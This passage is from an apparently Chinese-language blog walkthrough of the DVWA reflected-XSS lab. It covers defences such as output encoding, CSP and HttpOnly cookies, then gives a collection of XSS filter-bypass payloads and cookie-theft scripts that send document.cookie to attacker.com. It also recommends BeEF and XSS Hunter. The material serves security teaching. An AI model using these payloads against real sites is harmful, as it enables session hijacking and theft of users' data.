URL参数</span></span><br><span class="line"><span class="title function_ invoke__">urlencode</span>(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSS</span></span><br><span class="line"><span class="comment">// 避免用户输入直接进入CSS，或使用CSS编码库</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-内容安全策略（CSP）"><a href="#3-内容安全策略（CSP）" class="headerlink" title="3. 内容安全策略（CSP）"></a>3. 内容安全策略（CSP）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置CSP头</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止内联脚本</span></span><br><span class="line"><span class="comment">// 只允许从同源加载脚本</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>CSP配置示例：</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:</span><br><span class="line">  <span class="literal">default</span>-src <span class="string">&#x27;self&#x27;</span>;                    <span class="meta"># 默认只允许同源</span></span><br><span class="line">  script-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;nonce-&#123;random&#125;&#x27;</span>;   <span class="meta"># 脚本必须有nonce</span></span><br><span class="line">  style-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span>;      <span class="meta"># 允许内联样式</span></span><br><span class="line">  img-src *;                             <span class="meta"># 允许任何来源的图片</span></span><br><span class="line">  <span class="built_in">object</span>-src <span class="string">&#x27;none&#x27;</span>;                     <span class="meta"># 禁止&lt;object&gt;</span></span><br><span class="line">  <span class="keyword">base</span>-uri <span class="string">&#x27;self&#x27;</span>;                       <span class="meta"># 限制&lt;base&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-输入验证（辅助）"><a href="#4-输入验证（辅助）" class="headerlink" title="4. 输入验证（辅助）"></a>4. 输入验证（辅助）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单验证</span></span><br><span class="line"><span class="variable">$allowed</span> = <span class="string">&#x27;/^[a-zA-Z0-9 ]+$/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$allowed</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 长度限制</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Input too long&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-HttpOnly-Cookie"><a href="#5-HttpOnly-Cookie" class="headerlink" title="5. HttpOnly Cookie"></a>5. HttpOnly Cookie</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防止JavaScript访问Cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;session&#x27;</span>, <span class="variable">$value</span>, [</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span> =&gt; <span class="literal">true</span>,    // 防止XSS窃取Cookie</span><br><span class="line">    <span class="string">&#x27;secure&#x27;</span> =&gt; <span class="literal">true</span>,      // 只通过HTTPS传输</span><br><span class="line">    <span class="string">&#x27;samesite&#x27;</span> =&gt; <span class="string">&#x27;Strict&#x27;</span> // 防止CSRF</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Blade模板自动转义</span></span><br><span class="line">&#123;&#123; <span class="variable">$user_input</span> &#125;&#125;  <span class="comment">// 自动使用htmlspecialchars()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不转义（危险！）</span></span><br><span class="line">&#123;!! <span class="variable">$html_content</span> !!&#125;  <span class="comment">// 仅用于可信内容</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="React示例"><a href="#React示例" class="headerlink" title="React示例"></a>React示例</h4><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// React自动转义</span></span><br><span class="line">&lt;div&gt;&#123;userInput&#125;&lt;<span class="regexp">/div&gt;  /</span><span class="regexp">/ 安全</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 危险方式（避免使用）</span></span><br><span class="line"><span class="regexp">&lt;div dangerouslySetInnerHTML=&#123;&#123;__html: userInput&#125;&#125; /</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><ol>
+<li><p><strong>使用模板引擎</strong></p>
+<ul>
+<li>Twig（PHP）</li>
+<li>Jinja2（Python）</li>
+<li>Handlebars（JavaScript）</li>
+<li>自动转义输出</li>
+</ul>
+</li>
+<li><p><strong>WAF（Web应用防火墙）</strong></p>
+<ul>
+<li>ModSecurity</li>
+<li>Cloudflare WAF</li>
+<li>AWS WAF</li>
+</ul>
+</li>
+<li><p><strong>定期审计</strong></p>
+<ul>
+<li>代码审计</li>
+<li>安全扫描工具</li>
+<li>渗透测试</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输出编码</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ htmlspecialchars</td>
+</tr>
+<tr>
+<td>过滤方式</td>
+<td>无</td>
+<td>str_replace</td>
+<td>preg_replace</td>
+<td>N&#x2F;A</td>
+</tr>
+<tr>
+<td>过滤目标</td>
+<td>无</td>
+<td><code>&lt;script&gt;</code></td>
+<td><code>&lt;script&gt;</code>变形</td>
+<td>N&#x2F;A</td>
+</tr>
+<tr>
+<td>大小写</td>
+<td>N&#x2F;A</td>
+<td>敏感</td>
+<td>不敏感</td>
+<td>N&#x2F;A</td>
+</tr>
+<tr>
+<td>可绕过性</td>
+<td>完全开放</td>
+<td>容易</td>
+<td>容易</td>
+<td>不可绕过</td>
+</tr>
+<tr>
+<td>典型Payload</td>
+<td><code>&lt;script&gt;</code></td>
+<td><code>&lt;img&gt;</code></td>
+<td><code>&lt;img&gt;</code></td>
+<td>无效</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>简单</td>
+<td>不可能</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="常用XSS-Payload集合"><a href="#常用XSS-Payload集合" class="headerlink" title="常用XSS Payload集合"></a>常用XSS Payload集合</h2><h3 id="基础Payload"><a href="#基础Payload" class="headerlink" title="基础Payload"></a>基础Payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 标准脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">domain</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 大小写混淆 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 双写绕过 --&gt;</span></span><br><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- onerror --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(String.fromCharCode(88,83,83))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onload --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onclick --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Click<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onmouseover --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Hover<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="HTML5标签"><a href="#HTML5标签" class="headerlink" title="HTML5标签"></a>HTML5标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- svg --&gt;</span></span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- details --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- video --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- audio --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- marquee --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML实体编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;<span class="symbol">&amp;#88;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#83;</span>&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Unicode编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\u0061\u006c\u0065\u0072\<span class="title function_">u0074</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 十六进制编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span>(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Base64 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 简单窃取 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用fetch --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用img --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;this.src=&#x27;http://attacker.com/?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用XMLHttpRequest --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> xhr=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
+<ol>
+<li><strong>Low难度</strong> - 理解XSS基本原理</li>
+<li><strong>Medium难度</strong> - 学习简单绕过技巧</li>
+<li><strong>High难度</strong> - 掌握正则绕过方法</li>
+<li><strong>Impossible难度</strong> - 理解正确的防御</li>
+</ol>
+<p><strong>测试流程：</strong></p>
+<ol>
+<li>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>测试</li>
+<li>如果被过滤，尝试大小写混淆</li>
+<li>如果仍被过滤，使用其他标签</li>
+<li>使用Burp Suite查看过滤规则</li>
+<li>针对性构造Payload</li>
+</ol>
+<p><strong>工具推荐：</strong></p>
+<ul>
+<li>Burp Suite - 拦截和修改请求</li>
+<li>XSSer - 自动化XSS扫描</li>
+<li>BeEF - 浏览器利用框架</li>
+<li>XSS Hunter - XSS盲打平台</li>
+</ul>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不窃取真实用户数据</li>
+<li>学习目的是防御，不是攻击</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/XSS_Reflected_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - XSS Reflected (反射型XSS) 攻防练习详解">http://caixuya.github.io/2025/11/20/XSS_Reflected_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/20/Weak_Session_IDs_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - Weak Session IDs (弱会话ID) 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - Weak Session IDs (弱会话ID) 攻防练习详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/XSS_Stored_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - XSS Stored (存储型XSS) 攻防练习详解">
+      DVWA - XSS Stored (存储型XSS) 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88Reflected-Cross-Site-Scripting%EF%BC%89%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是反射型XSS（Reflected Cross-Site Scripting）？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%B5%8B%E8%AF%95"><span class="nav-number">3.4.1.</span> <span class="nav-text">步骤1：基础测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E7%AA%83%E5%8F%96Cookie"><span class="nav-number">3.4.2.</span> <span class="nav-text">步骤2：窃取Cookie</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="nav-number">3.4.3.</span> <span class="nav-text">步骤3：键盘记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.4.</span> <span class="nav-text">步骤4：钓鱼攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45%EF%BC%9ABeEF%E6%8C%82%E9%92%A9"><span class="nav-number">3.4.5.</span> <span class="nav-text">步骤5：BeEF挂钩</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A46%EF%BC%9AURL%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.4.6.</span> <span class="nav-text">步骤6：URL编码绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 